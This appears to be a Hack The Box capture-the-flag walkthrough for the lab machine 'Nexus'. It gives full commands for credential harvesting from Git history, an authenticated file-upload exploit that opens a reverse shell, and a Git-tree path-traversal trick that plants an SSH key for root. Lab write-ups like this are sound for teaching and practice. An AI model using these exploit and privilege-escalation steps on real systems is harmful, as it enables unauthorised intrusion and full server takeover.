# Hack The Box – Nexus (Easy Linux)

## 1. Reconnaissance

```bash
nmap -sSVC -A 10.129.187.201
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
```

Added the host to `/etc/hosts`:

```bash
echo "10.129.187.201 nexus.htb" | sudo tee -a /etc/hosts
```

---

## 2. Subdomain Enumeration

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
     -u http://nexus.htb/ -H "Host: FUZZ.nexus.htb" -fw 4
```

Interesting results:

- `git.nexus.htb` → Gitea
- `billing.nexus.htb` → Krayin CRM

```bash
echo "10.129.187.201 git.nexus.htb billing.nexus.htb" | sudo tee -a /etc/hosts
```

---

## 3. Gitea – Credential Leak

Browsing `http://git.nexus.htb` revealed a public repository.  
Looking through the commit history of the `.env` file showed a previous clear-text password:

```
j.matthew@nexus.htb : N27xh!!2ucY04
```

The same email appeared on the main company website under the Careers / Job application section.

---

## 4. Krayin CRM – Initial Foothold (CVE-2026-38526)

Logged into `http://billing.nexus.htb/admin/login` with the credentials above.

Krayin CRM 2.2.x is vulnerable to **CVE-2026-38526** – authenticated arbitrary file upload via the TinyMCE endpoint `/admin/tinymce/upload`.

### Exploitation

```bash
# Listener
nc -lvnp 4444

# Exploit (example using public PoC)
python3 exploit.py \
  -u http://billing.nexus.htb \
  -e j.matthew@nexus.htb \
  -p 'N27xh!!2ucY04' \
  --lhost <tun0_IP> \
  --lport 4444
```

Got a reverse shell as **www-data**.

---

## 5. Lateral Movement to User

Inside the shell:

```bash
cat /var/www/krayin/.env
```

Found a second password:

```
DB_PASSWORD=y27xb3ha!!74GbR
```

This password worked for the local user `jones`:

```bash
ssh jones@nexus.htb
# password: y27xb3ha!!74GbR
```

User flag obtained.

---

## 6. Privilege Escalation – Gitea Template Sync Path Traversal

As `jones`:

```bash
systemctl list-timers | grep gitea
systemctl cat gitea-template-sync.service
cat /etc/gitea/template-sync.py
```

The service runs **as root** every minute and synchronises repositories marked as **Template**.  
The critical line is:

```python
target = os.path.join(stage_path, filepath)
```

`os.path.join()` does **not** sanitise `../`.  
Staging directory is `/home/git/template-staging/<owner>/<repo>`, so **5 levels** of `../` are enough to reach `/root/.ssh/authorized_keys`.

### Exploitation steps

1. Created a new repository `pwns` and marked it as **Template**.

2. Generated an SSH key:

```bash
ssh-keygen -t ed25519 -f /tmp/id_root -N ""
```

3. Cloned the repository using localhost (DNS resolution issue):

```bash
git clone http://jones:'y27xb3ha!!74GbR'@127.0.0.1:3000/jones/pwns.git
cd pwns
```

4. Built a malicious Git tree with path traversal:

```bash
cp /tmp/id_root.pub /tmp/authorized_keys
BLOB=$(git hash-object -w /tmp/authorized_keys)

T1=$(printf '100644 blob %s\tauthorized_keys\n' $BLOB | git mktree)
T2=$(printf '040000 tree %s\t.ssh\n' $T1 | git mktree)
T3=$(printf '040000 tree %s\troot\n' $T2 | git mktree)
T4=$(printf '040000 tree %s\t..\n' $T3 | git mktree)
T5=$(printf '040000 tree %s\t..\n' $T4 | git mktree)
T6=$(printf '040000 tree %s\t..\n' $T5 | git mktree)
T7=$(printf '040000 tree %s\t..\n' $T6 | git mktree)
T8=$(printf '040000 tree %s\t..\n' $T7 | git mktree)

git config user.email "jones@nexus.htb"
git config user.name "jones"

COMMIT=$(echo "pwn" | git commit-tree $T8)
git update-ref refs/heads/main $COMMIT
git push -u origin main --force
```

5. Waited for the timer (or monitored the log):

```bash
tail -f /var/log/template-sync.log
```

Output confirmed:

```
synced: ../../../../../root/.ssh/authorized_keys
```

6. SSH as root:

```bash
ssh -i /tmp/id_root root@127.0.0.1
```

Root flag obtained.

---

## Summary of Attack Path

```
nmap → vhost discovery (git + billing)
      → Gitea commit history → credentials
      → Krayin CRM login → CVE-2026-38526 (TinyMCE upload)
      → www-data shell → .env credentials
      → SSH as jones
      → Gitea template-sync path traversal
      → SSH key written to /root/.ssh/authorized_keys
      → root
```

---

**Flags**  
`user.txt` → jones  
`root.txt` → root
```
